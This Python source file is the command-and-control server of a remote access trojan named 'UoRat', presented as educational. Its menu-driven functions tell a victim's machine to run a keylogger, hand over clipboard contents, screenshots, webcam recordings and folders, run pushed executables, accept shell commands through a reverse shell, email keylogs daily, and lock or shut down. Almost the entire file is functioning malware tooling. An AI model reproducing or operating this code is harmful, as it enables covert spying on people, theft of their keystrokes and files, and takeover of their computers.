"""
+-----------------------------------------------------------------------+
|                               UoRat                                   |
|    Author: 27016005                                                   |
|    Version: 0.9.0                                                     |
|    Last update: 19-04-2021 (dd-mm-yyyy)                               |
|                                                                       |
|                 [   ONLY FOR EDUCATIONAL PURPOSES   ]                 |
+-----------------------------------------------------------------------+
------- CONFIGURATION ------
In order to use this tool you need to do some tweaking:
    1. The Server's IP gets automatically set by taking the address from /etc/hosts (Linux), check if your LAN address exists in this file. I had to put it manually since there was only localhost.
    2. Select a PORT number, the default value set in the client file is 1337
    3. Play around with the paths, I've set some default values but you can change them
------ NOTE ------
This code was tested and developed on a Windows machine, in theory it should work on Linux - it may not work on other machines.
"""

import socket
import sys
import os
import time
import random
import string
from zipfile import ZipFile

import cv2


class Server:
# '''SOCKET SET UP STARTS HERE'''
    def __init__(self, ip, port, buffer_size):
        self.IP = ip
        self.PORT = port
        #self.BACKUP_PORT = 8080
        self.BUFFER_SIZE = buffer_size
        self.connections = []  # connections list
        self.info = ""  # info about target
        self.recvcounter = 0  # counter for received files
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        self.Switcher = {
            "-msgbox": self.systemmsg,
            "-msg": self.sendMsg,
            "-shutdown": self.shutdown,
            "-shutdownM": self.shutdownmessage,
            "-lock": self.locksystem,
            "-restart": self.restartsystem,
            "-EpIV": self.playstarwars,
            "-chess": self.playchess,
            "-weather": self.weather,
            "-telnet": self.enableTN,
            "-KLstart": self.startKeyLogger,
            #"-KLend": self.stopKeyLogger,
            "-getLogs": self.getKeyLogs,
            "-getcb": self.getClipBoard,
            "-Fsend": self.filesend,
            "-Frecv": self.filereceive,
            "-ginfo": self.getTargetInfo,
            "-exe": self.exePy,
            "-ss": self.screenshot,
            "-vid": self.vidByFrames,
            "-WCrec":self.webcamRec,
            "-WCplay":self.webcamPlay,
            "-shell": self.cmdctrl,
            "-email": self.email,
            "-dailymail": self.startEmailthread,
            "-endmailer": self.stopEmailThread,
            "-clear":self.clear,
            "-drop": self.closeConnection,
            "-disc": self.disconnectTarget,
            "-menu": self.mainmenu
        }

    def mainmenu(self):

        Switcher = {
            "-msgbox": "Send a custom Alert Messagebox",
            "-msg": "\tSend a console message",
            "-shutdown": "Shutdown the target device",
            "-shutdownM": "Shutdown the target device, with a custom message",
            "-lock": "\tLock the target Device",
            "-restart": "Restart the target system",
            "-EpIV": "\tConnect to a telnet server which plays an ASCII Animation of Star Wars EpIV: A New Hope",
            "-chess": "Connect to a telnet server allowing the victim to play chess",
            "-weather": "Opens a telnet based weather forecasting service",
            "-telnet": "Enables Telnet on the targets device - providing they have permissions",
            "-KLstart": "Start the keylogger",
            # "-KLend": "Stop the Keylogger",
            "-getLogs": "Retrieve the keylogs",
            "-getcb": "Retrieve the clipboard contents and save to file",
            "-Fsend": "Send a file from the Victim to this device",
            "-Frecv": "Send a file from this device to the victim",
            "-ginfo": "Obtain as much information from the victim as possible",
            "-exe": "\tRun an Executable file or Script",
            "-ss": "\tTake a screenshot of the target device",
            "-vid": "\tTake a series of screenshots which can be used to make a video",
            "-WCrec": "Record (& Retrieve)the webcam from the targets device",
            "-WCplay": "Play The Recorded Webcam frames",
            "-shell": "Non interactive Reverse Shell - Enter CMD Commands to be executed on the target device",
            "-email": "Email contents of a chosen file",
            "-dailymail": "Start a thread to Email the keylog files at a given time everyday",
            "-endmailer": "Stop the email schedule thread",
            "-drop": "\tDrop the connection",
            #"-disc": "\tDisconnect session, keep client alive ",
            "-clear": "Clear Console",
            "-Menu": "\tPrint this menu again"
        }
        print("\nCommand: \t\t Description:\n")
        for k, v in Switcher.items():
            print(k + ": \t\t" + v)
        print("\n")

    def startEmailthread(self):
        command = "-dailymail"
        self.client_socket.send(command.encode())
        response = self.client_socket.recv(self.BUFFER_SIZE).decode()
        print(response)

    def stopEmailThread(self):
        command = "-endmailer"
        self.client_socket.send(command.encode())
        response = self.client_socket.recv(self.BUFFER_SIZE).decode()
        print(response)

    def clear(self):
        os.system("cls")

    def startServer(self):
        self.server.bind((self.IP, self.PORT))
        self.server.listen(2)
        self.acceptConnections()

    def acceptConnections(self):
        print(self.IP)
        print("*** Listening for incoming connections ***")

        self.client_socket, self.address = self.server.accept()
        print(f"*** Connection from {self.address} has been established! ***")
        self.connections.append(self.client_socket)
        # # safemode

        mode = self.client_socket.recv(self.BUFFER_SIZE).decode("utf-8")
        print(mode)
        if mode == "2":
            print("[-] Virtuous mode")
            self.connectionconfirm()
        else:
            print("[-] Malicious mode")
        self.commands()
        # # print("hello worlds")

    def generatekey(self):
        # Creates a password containing uppercase, lowercase, numerical digits and punctuation.
        letters = (string.ascii_letters + string.digits + string.punctuation)
        code = ''.join(random.choices(letters, k=10))
        # print("Key =  " + code)
        return code

    def connectionconfirm(self):
        key = self.generatekey()
        print("[##] Key =  " + key)

        self.client_socket.send(key.encode("utf-8"))

        response = self.client_socket.recv(self.BUFFER_SIZE).decode()
        if response == "[#] KEY MISMATCH":
            self.closeConnection()

    def closeConnection(self):
        self.client_socket.send("-drop".encode())
        self.connections.remove(self.client_socket)
        self.client_socket.close()
        self.server.close()
        sys.exit()

    def disconnectTarget(self):
        self.client_socket.send("-disc".encode())
        self.connections.remove(self.client_socket)
        self.client_socket.close()
        sys.exit()
        # self.client_socket.send("-disc".encode())
        # self.connections.remove(self.client_socket)
        # self.client_socket.close()
        # self.server.close()
        # print("*** Killed")

    # try to update the buffer with recv sized
    def updateBuffer(self, size):
        buff = ""
        for counter in range(0, len(size)):
            if size[counter].isdigit():
                buff += size[counter]

        return int(buff)

    # for files bigger than buffer
    def saveBigFile(self, size, buff):
        full = b''
        while True:
            if sys.getsizeof(full) >= size:
                break

            recvfile = self.client_socket.recv(buff)

            full += recvfile

        return full

# ''' SOCKET SET UP ENDS HERE '''

# ''' COMMAND FUNCTIONS START HERE'''
    '''WINDOWS FUNCTIONS'''
    def sendMsg(self):
        command = "-msg"
        self.client_socket.send(command.encode())
        msg = input("[+] Enter message: ")
        time.sleep(2)
        self.client_socket.send(msg.encode())
        print(msg)
        results = (self.client_socket.recv(self.BUFFER_SIZE).decode())
        print(results)

    def shutdown(self):
        command = "-shutdown"
        self.client_socket.send(command.encode("utf-8"))

        self.client_socket.close()
        print(f"[!] {self.address[0]} has been Shut Down")

        # locks the user out while keeping connection up

    def shutdownmessage(self):
        command = "-shutdownM"
        self.client_socket.send(command.encode("utf-8"))
        msg = input("[+] Enter message: ")
        time.sleep(2)
        self.client_socket.send(msg.encode())
        print(msg)
        results = (self.client_socket.recv(self.BUFFER_SIZE).decode())
        print(results)

        self.client_socket.close()
        print(f"[!] {self.address[0]} has been Shut Down")

    def locksystem(self):
        command = "-lock"
        self.client_socket.send(command.encode("utf-8"))
        response = self.client_socket.recv(self.BUFFER_SIZE).decode("utf-8")
        print(response)

    def restartsystem(self):
        command = "-restart"
        self.client_socket.send(command.encode("utf-8"))
        response = self.client_socket.recv(self.BUFFER_SIZE).decode("utf-8")
        print(response)

    ## TODO: CHECK THIS
    def systemmsg(self):
        command = "-msgbox"
        self.client_socket.send(command.encode())
        msg = input("[+] Enter message: ")
        time.sleep(2)
        self.client_socket.send(msg.encode())
        print(msg)
        results = (self.client_socket.recv(self.BUFFER_SIZE).decode())
        print(results)

# '''TELNET FUNCTIONS'''
    def playstarwars(self):
        command = "-EpIV"
        self.client_socket.send(command.encode("utf-8"))
        status = self.client_socket.recv(self.BUFFER_SIZE).decode("utf-8")
        if status == "SUCCESS":
            print(f"[!] {self.address[0]} is now watching Star Wars Episode IV:  A New Hope")
        else:
            print("Something went Wrong")
        print(status)

    def playchess(self):
        command = "-chess"
        self.client_socket.send(command.encode("utf-8"))
        status = self.client_socket.recv(self.BUFFER_SIZE).decode("utf-8")
        if status == "SUCCESS":
            print(f"[!] {self.address[0]} is now Playing Chess!! ♜	♞	♝	♛	♚	♝	♞	♜")
        else:
            print("Something went Wrong")
        print(status)

    def weather(self):
        command = "-weather"
        self.client_socket.send(command.encode("utf-8"))
        status = self.client_socket.recv(self.BUFFER_SIZE).decode("utf-8")
        if status == "SUCCESS":
            print(f"[!] {self.address[0]} is checking the weather! ")
        else:
            print("Something went Wrong")
        print(status)

    def enableTN(self):
        command = "-telnet"
        self.client_socket.send(command.encode("utf-8"))
        status = self.client_socket.recv(self.BUFFER_SIZE).decode("utf-8")
        if status == "SUCCESS":
            print(f"[!] {self.address[0]} *SHOULD* now have Telnet Client Enabled")
        else:
            print("Something went Wrong")
        print(status)

# ''' KEYLOGGER FUNCTIONS '''
    def startKeyLogger(self):
        command = "-KLstart"
        self.client_socket.send(command.encode("utf-8"))
        response = self.client_socket.recv(self.BUFFER_SIZE).decode("utf-8")
        print(response)

    def stopKeylogger(self):
        command = "-KLend"
        self.client_socket.send(command.encode("utf-8"))
        response = self.client_socket.recv(self.BUFFER_SIZE).decode("utf-8")
        print(response)

    def retrievelogs(self):

    # """ Receiving the keylogger files """
        command = "--getlogs"
        self.client_socket.send(command.encode("utf-8"))

        flag = self.client_socket.recv(self.BUFFER_SIZE).decode("utf-8")
        if flag == "[OK]":
            # recv size
            size = self.client_socket.recv(self.BUFFER_SIZE).decode("utf-8")
            time.sleep(0.1)

            if int(size) <= self.BUFFER_SIZE:
                # recv archive
                archive = self.client_socket.recv(self.BUFFER_SIZE)
                print("*** Got logs ***")

                with open('../receivedfile/keylogs.zip', 'wb+') as output:
                    output.write(archive)

                print("*** Logs saved ***")

            else:
                # update buffer
                buff = self.updateBuffer(size)

                # recv archive
                fullarchive = self.saveBigFile(int(size), buff)

                print("*** Got logs ***")
                with open('../receivedfile/keylogs.zip', 'wb+') as output:
                    output.write(fullarchive)

                print("*** Logs saved ***")
        else:
            print("[!] FATAL: Logs do not exist!")

    def getKeyLogs(self):
        """ Receiving the keylogger files """

        command = "--getlogs"
        self.client_socket.send(command.encode("utf-8"))

        flag = self.client_socket.recv(self.BUFFER_SIZE).decode("utf-8")
        if flag == "[OK]":
            # recv size
            size = self.client_socket.recv(self.BUFFER_SIZE).decode("utf-8")
            time.sleep(0.1)

            if int(size) <= self.BUFFER_SIZE:
                # recv archive
                archive = self.client_socket.recv(self.BUFFER_SIZE)
                print("*** Got logs ***")

                with open('../receivedfile/keylogs.zip', 'wb+') as output:
                    output.write(archive)

                print("*** Logs saved ***")

            else:
                # update buffer
                buff = self.updateBuffer(size)

                # recv archive
                fullarchive = self.saveBigFile(int(size), buff)

                print("*** Got logs ***")
                with open('../receivedfile/keylogs.zip', 'wb+') as output:
                    output.write(fullarchive)

                print("*** Logs saved ***")
        else:
            print("[!] FATAL: Logs do not exist!")

    def getClipBoard(self):
        """ Get victim' clipboard in plain text """

        command = "-getcb"
        self.client_socket.send(command.encode("utf-8"))

        # recv clipboard
        cb = self.client_socket.recv(self.BUFFER_SIZE)
        print("*** Got clipboard ***")

        with open('../receivedfile/cb.txt', 'w+') as f:
            f.write(cb.decode("utf-8"))

        print("*** Wrote it to cb.txt ***")

# ''' FILE HANDLING '''
    def filesend(self):
        command = "-Fsend"
        self.client_socket.send(command.encode("utf-8"))

        path = input("[+] Enter the file path of the designated folder (NOT A SINGLE FILE): ")
        self.client_socket.send(path.encode("utf-8"))

        response = self.client_socket.recv(self.BUFFER_SIZE).decode("utf-8")
        if response == "[*] Success":
            size = self.client_socket.recv(self.BUFFER_SIZE).decode("utf-8")
            print("Size  = " + size)
            time.sleep(0.1)
            if int(size) <= self.BUFFER_SIZE:
                # recv archive
                archive = self.client_socket.recv(self.BUFFER_SIZE)
                print("*** Got small file ***")

                with open(f'../receivedfile/received{str(self.recvcounter)}.zip', 'wb+') as output:
                    output.write(archive)

                print("*** File saved ***")
                self.recvcounter += 1
            else:
                # update buffer
                buff = self.updateBuffer(size)

                # recv archive
                fullarchive = self.saveBigFile(int(size), buff)

                print("*** Got large file *** ")
                with open(f'../receivedfile/received{str(self.recvcounter)}.zip', 'wb+') as output:
                    output.write(fullarchive)

                print("*** File saved ***")
                self.recvcounter += 1
        else:
            print(response.decode("utf-8"))

    def filereceive(self):
        command = "-Frecv"
        self.client_socket.send(command.encode())

        while True:
            try:
                path = input("[+] Enter file path: ")

                if not os.path.exists(path):
                    raise FileNotFoundError
                else:
                    break
            except FileNotFoundError:
                print("[!] File not found, retry")

        name = input("[+] Enter the name to save this file as on the victims device (include file extension): ")  # file name, must include extension
        self.client_socket.send(name.encode("utf-8"))

        with open(path, 'rb') as to_send:
            fsize = os.path.getsize(path)
            self.client_socket.send(str(fsize).encode())
            time.sleep(1)

            data = to_send.read()
            self.client_socket.send(data)
        print("*** File sent ***")

    def email(self):
        command = "-email"
        self.client_socket.send(command.encode())
        path = input("[+] Enter the file path of the designated file to have emailed: ")
        self.client_socket.send(path.encode("utf-8"))
        response = self.client_socket.recv(self.BUFFER_SIZE).decode()
        print(response)



# ''' MISC '''

    def getTargetInfo(self):
        print("here")
        command = "-ginfo"
        self.client_socket.send(command.encode("utf-8"))

        info = self.client_socket.recv(self.BUFFER_SIZE).decode("utf-8")
        print("info = " + info)
        more = self.client_socket.recv(self.BUFFER_SIZE)
        print("more = " + str(more))
        ##### EVEN MORE IS LARGER THAN BUFFER SIZE ######
        emsize = self.client_socket.recv(self.BUFFER_SIZE).decode("UTF-8")
        print("emsize =" + str(emsize))
        if int(emsize) >= self.BUFFER_SIZE:
            print("bigboi")
            buff = self.updateBuffer(emsize)
            print("buffer = " + str(buff))
            evenmore = self.saveBigFile(int(emsize), buff)
            print("evenmore =" + str(evenmore.decode()))
        else:
            evenmore = self.client_socket.recv(self.BUFFER_SIZE)
        moresysinfo = input("Would you like to see more?: ")
        if moresysinfo == "yes":
            print(more.decode())

        print(moresysinfo + "\n\n")
        """ writing additional information in a file """

        with open('../receivedfile/info.txt', 'wb+') as f, open('./logs/moreinfoS.txt', 'wb+') as m:
            f.write(more)
            m.write(evenmore)
            print("DONE")
        # with open('./logs/moreinfoS.txt', "rb+") as m:
        # print(m.read())
        print("\n# OS:" + info)
        print("# IP:" + self.address[0])
        print("*** Check info.txt for more details on the target ***")
        print("**** Check moreinfo.txt for even more details on the target ****")

        return info

    def exePy(self):
        command ="-exe"
        self.client_socket.send(command.encode())
        filename = input("[+] Enter the full filepath: ")
        self.client_socket.send(filename.encode())
        print("FilePath Sent")
        response = self.client_socket.recv(self.BUFFER_SIZE).decode()
        print("*** " + response + " *** ")

# ''' SCREENSHOT FUNCTIONS '''
    def screenshot(self):
        command = "-ss"
        self.client_socket.send(command.encode())

        # recv file size
        recvsize = self.client_socket.recv(self.BUFFER_SIZE).decode()
        time.sleep(0.1)

        # updating buffer
        buff = self.updateBuffer(recvsize)

        # getting the file
        print("*** Saving screenshot ***")
        fullscreen = self.saveBigFile(int(recvsize), buff)

        # saving the file
        with open(f'../receivedfile/{time.time()}.png', 'wb+') as screen:
            screen.write(fullscreen)

        print("*** File saved ***")

    def vidByFrames(self):
        # ''' this will take n*x screenshots where n = number of seconds and x = frames per seconds
        n = 5  # Number of seconds
        x = 24  # Frames per second
        for i in range(x*n):
            self.screenshot()
            time.sleep(1/x)

    def webcamPlay(self):

        #path = f'../receivedfile/webcam{str(self.recvcounter - 1)}'
        path = f'../receivedfile/webcamS'
        path2 = f'../receivedfile/webcamS/logs/Video'
        print(str(path))
        with ZipFile(path + ".zip", 'r') as zip_ref:
            zip_ref.extractall(path)

        cv2.namedWindow(f"{self.address[0]}'s Webcam")
        with os.scandir(path2) as entries:
            for entry in entries:
                print(entry.name)
                p = str(path2) + str("/") + str(entry.name)
                x = cv2.imread(p)
                cv2.imshow(f"{self.address[0]}'s Webcam", x)
                cv2.waitKey(0)
        cv2.destroyWindow(f"{self.address[0]}'s Webcam")

    def webcamRec(self):
        command = "-WCrec"
        self.client_socket.send(command.encode("utf-8"))

        response = self.client_socket.recv(self.BUFFER_SIZE)
        if response.decode("utf-8") == "Success":
            size = self.client_socket.recv(self.BUFFER_SIZE).decode("utf-8")
            time.sleep(0.1)
            print("Size  = " + size)
            if int(size) <= self.BUFFER_SIZE:
                # recv archive
                archive = self.client_socket.recv(self.BUFFER_SIZE)
                print("*** Got small file ***")

                with open(f'../receivedfile/webcamS.zip', 'wb+') as output:
                    print("Opened file s ")
                    output.write(archive)

                print("*** File saved ***")
                self.recvcounter += 1
            else:
                # update buffer
                buff = self.updateBuffer(size)

                # recv archive
                fullarchive = self.saveBigFile(int(size), buff)

                print("*** Got large file *** ")
                with open(f'../receivedfile/webcamS.zip', 'wb+') as output:
                    print("Opened file L ")
                    output.write(fullarchive)

                print("*** File saved ***")
                self.recvcounter += 1
        else:
            print(response.decode("utf-8"))

# ''' MAIN BULK '''
    def commands(self):
            self.mainmenu()
            # os.system("clear")
            while True:
             # get the command from prompt
                command = input("Enter the command you want to execute:")
                # send the command to the client
                print(command)
                # self.client_socket.send(command.encode())

                if command == "exit":
                    # if the command is exit, just break out of the loop
                    break
                else:
                    try:
                        func = self.Switcher.get(command)
                        func()
                    except TypeError:
                        print("This operation does not exist. ")
                    except ConnectionResetError:
                        """ if the target hard-closes the connection we will receive only a RST packet (TCP), so here we close the connection safely """

                        print("[!] Connection Reset Error")
                        #self.closeConnection()
                    except KeyboardInterrupt:
                        print("\n[ STOPPED RECEIVING DATA ]")
                    except Exception as e:
                        print("Even I don't know how you got this error - so I'll lock the pc. " + str(e))

            sys.exit()
            # close connection to the client
            self.client_socket.close()
            # close server connection
            self.close()

            print(results)

    def cmdctrl(self):
        """ This is not a real interactive shell, you get the output
        of the command but you can't interact with it """

        print("[!] -back to exit shell")
        while True:
            cmd = input(f"[{self.address[0]}]$ ") # can't .lower() here as sent commands may include uppercase characters

            if not cmd:
                print("[!] Can't send empty command.")
                continue

            if cmd.lower() == "-back":
                print("GO BACK")
                break

            time.sleep(2)
            command = "-shell"
            self.client_socket.send(command.encode("utf-8"))
            self.client_socket.send(cmd.encode("utf-8"))

            output = self.client_socket.recv(self.BUFFER_SIZE)

            if not output:
                print("NO OUTPUT")
                input()
                self.connections.remove(self.client_socket)
                self.client_socket.close()
                self.server.close()
                break

            print(output.decode("utf-8"))




def main():
    """ Creating the necessary dirs """

    try:
        os.mkdir('../receivedfile')
    except FileExistsError:
        pass

    # banner()
    time.sleep(1)

    HOSTNAME = socket.gethostname()
    IP = socket.gethostbyname(HOSTNAME)
    PORT = 1337  # int(input("[+] Listen on port> "))
    BUFFERSIZE = 2048

    server = Server(IP, PORT, BUFFERSIZE)

    try:
        server.startServer()
    except Exception as e:
        print("*** Error while starting the server:", str(e) + " ***")
    # just sending a message, for demonstration purposes
    message = "Hello and Welcome".encode()
    # server.client_socket.send(message)


if __name__ == "__main__":
    main()

